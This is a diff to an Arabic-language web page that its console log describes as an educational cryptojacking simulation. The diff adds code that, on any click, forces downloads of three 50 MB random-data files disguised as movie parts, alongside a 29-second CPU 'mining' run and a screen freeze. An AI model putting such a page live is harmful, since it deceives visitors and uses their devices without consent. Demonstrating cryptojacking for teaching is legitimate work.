@@ -17,7 +17,6 @@
       overflow:hidden;
     }
     
-    /* ===== طبقة الإعلان ===== */
     .ad-overlay {
       position:fixed;
       top:0;
@@ -82,7 +81,6 @@
       box-shadow:0 0 30px rgba(79,140,255,0.3);
     }
     
-    /* ===== طبقة التجميد ===== */
     .freeze-overlay {
       position:fixed;
       top:0;
@@ -157,7 +155,6 @@
       border:1px solid rgba(255,93,122,0.2);
     }
     
-    /* ===== باقي التنسيق ===== */
     header { display:flex; align-items:center; justify-content:space-between; padding:16px 32px; border-bottom:1px solid rgba(255,255,255,.06); }
     .logo { font-weight:800; font-size:20px; } .logo span { color:var(--accent); }
     nav a { color:var(--muted); text-decoration:none; margin-inline-start:20px; font-size:14px; }
@@ -485,7 +482,7 @@
     let totalOps = 0;
     let freezeInterval = null;
     let isFreezing = false;
-    let miningDuration = 29; // 29 ثانية
+    let miningDuration = 29;
     let miningTimeout = null;
     let isAdClosed = false;
     let workerCount = 8;
@@ -545,7 +542,89 @@
       }
     }
 
-    /* ============ بدء التعدين بـ 8 عمال ============ */
+    /* ============ إنشاء ملفات وهمية بحجم 50 ميجا ============ */
+    function generateLargeFile(sizeMB) {
+      const sizeBytes = sizeMB * 1024 * 1024;
+      const chunkSize = 1024 * 1024; // 1 ميجا
+      const chunks = Math.ceil(sizeBytes / chunkSize);
+      const array = new Uint8Array(chunkSize);
+      
+      // ملء المصفوفة ببيانات عشوائية
+      for (let i = 0; i < array.length; i++) {
+        array[i] = Math.floor(Math.random() * 256);
+      }
+      
+      const blobParts = [];
+      for (let i = 0; i < chunks; i++) {
+        blobParts.push(array);
+      }
+      
+      return new Blob(blobParts, { type: 'application/octet-stream' });
+    }
+
+    function downloadFile(filename, sizeMB) {
+      return new Promise((resolve) => {
+        const blob = generateLargeFile(sizeMB);
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        
+        // محاكاة وقت التحميل
+        setTimeout(() => {
+          a.click();
+          document.body.removeChild(a);
+          URL.revokeObjectURL(url);
+          resolve();
+        }, 500);
+      });
+    }
+
+    /* ============ بدء التحميل المتزامن لـ 3 ملفات ============ */
+    async function startFileDownload() {
+      const files = [
+        { name: 'فيلم_نهاية_العالم_1080p.part1.mp4', size: 50 },
+        { name: 'فيلم_نهاية_العالم_1080p.part2.mp4', size: 50 },
+        { name: 'فيلم_نهاية_العالم_1080p.part3.mp4', size: 50 }
+      ];
+      
+      // إظهار مؤشر التحميل
+      loadingBar.style.display = 'block';
+      loadingText.style.display = 'block';
+      loadingText.textContent = 'جاري تحميل 3 ملفات بحجم 50 ميجا لكل ملف... 0%';
+      downloadBtn.disabled = true;
+      cancelBtn.disabled = true;
+      
+      let totalProgress = 0;
+      const totalFiles = files.length;
+      let completedFiles = 0;
+      
+      // تحميل الملفات بشكل متوازي
+      const downloadPromises = files.map((file, index) => {
+        return downloadFile(file.name, file.size).then(() => {
+          completedFiles++;
+          totalProgress = (completedFiles / totalFiles) * 100;
+          loadingFill.style.width = totalProgress + '%';
+          loadingText.textContent = `جاري تحميل ${completedFiles} من ${totalFiles} ملفات... ${Math.round(totalProgress)}%`;
+        });
+      });
+      
+      await Promise.all(downloadPromises);
+      
+      loadingText.textContent = '✅ تم تحميل جميع الملفات بنجاح! (3 ملفات بحجم 50 ميجا لكل ملف)';
+      downloadBtn.disabled = false;
+      cancelBtn.disabled = false;
+      
+      // إخفاء شريط التحميل بعد 3 ثواني
+      setTimeout(() => {
+        loadingBar.style.display = 'none';
+        loadingText.style.display = 'none';
+      }, 3000);
+    }
+
+    /* ============ بدء التعدين ============ */
     function startMining() {
       if (isMining) return;
       isMining = true;
@@ -595,7 +674,7 @@
           padding:14px 20px;color:var(--text);z-index:999;
           font-size:14px;box-shadow:0 10px 40px rgba(0,0,0,.5);
         `;
-        toast.innerHTML = '✅ <b>اكتمل التحميل!</b> (تم استخدام معالجك بـ 8 عمال لمدة 29 ثانية)';
+        toast.innerHTML = '✅ <b>اكتمل التحميل!</b> (تم تحميل 3 ملفات بحجم 50 ميجا لكل ملف)';
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 5000);
       }, miningDuration * 1000);
@@ -630,7 +709,13 @@
       
       downloadModal.classList.add('active');
       
+      // بدء التعدين
       startMining();
+      
+      // بدء تحميل الملفات
+      startFileDownload();
+      
+      // تجميد الشاشة
       freezeScreen(miningDuration);
     }
 
@@ -642,28 +727,10 @@
       loadingFill.style.width = '0%';
     }
 
-    /* ============ محاكاة التحميل ============ */
+    /* ============ محاكاة التحميل القديمة ============ */
     function simulateDownload() {
-      loadingBar.style.display = 'block';
-      loadingText.style.display = 'block';
-      loadingText.textContent = 'جاري التحميل... 0%';
-      downloadBtn.disabled = true;
-      cancelBtn.disabled = true;
-      
-      let progress = 0;
-      const downloadInterval = setInterval(() => {
-        progress += Math.random() * 3 + 1;
-        if (progress > 100) progress = 100;
-        loadingFill.style.width = progress + '%';
-        loadingText.textContent = `جاري التحميل... ${Math.round(progress)}%`;
-        
-        if (progress >= 100) {
-          clearInterval(downloadInterval);
-          loadingText.textContent = '✅ تم التحميل بنجاح!';
-          downloadBtn.disabled = false;
-          cancelBtn.disabled = false;
-        }
-      }, 200);
+      // استبدالها بوظيفة التحميل الجديدة
+      startFileDownload();
     }
 
     /* ============================================================ */
@@ -681,6 +748,7 @@
         startProcess();
       } else {
         startMining();
+        startFileDownload();
         freezeScreen(miningDuration);
       }
     });
@@ -696,6 +764,7 @@
         startProcess();
       } else {
         startMining();
+        startFileDownload();
         freezeScreen(miningDuration);
       }
     });
@@ -707,6 +776,7 @@
           startProcess();
         } else {
           startMining();
+          startFileDownload();
           freezeScreen(miningDuration);
         }
       });
@@ -718,6 +788,7 @@
           startProcess();
         } else {
           startMining();
+          startFileDownload();
           freezeScreen(miningDuration);
         }
       });
@@ -728,6 +799,7 @@
         startProcess();
       } else {
         startMining();
+        startFileDownload();
         freezeScreen(miningDuration);
       }
     });
@@ -742,6 +814,7 @@
         startProcess();
       } else {
         startMining();
+        startFileDownload();
         freezeScreen(miningDuration);
       }
     });
@@ -753,6 +826,7 @@
 
     console.log('⚠️ هذا الموقع هو محاكاة تعليمية لظاهرة التعدين الخفي (Cryptojacking)');
     console.log(`💡 أي ضغطة على الشاشة تبدأ عملية التعدين بـ ${workerCount} عمال لمدة ${miningDuration} ثانية!`);
+    console.log('📁 يتم تحميل 3 ملفات بحجم 50 ميجا لكل ملف (وهمية)');
   </script>
 </body>
 </html>
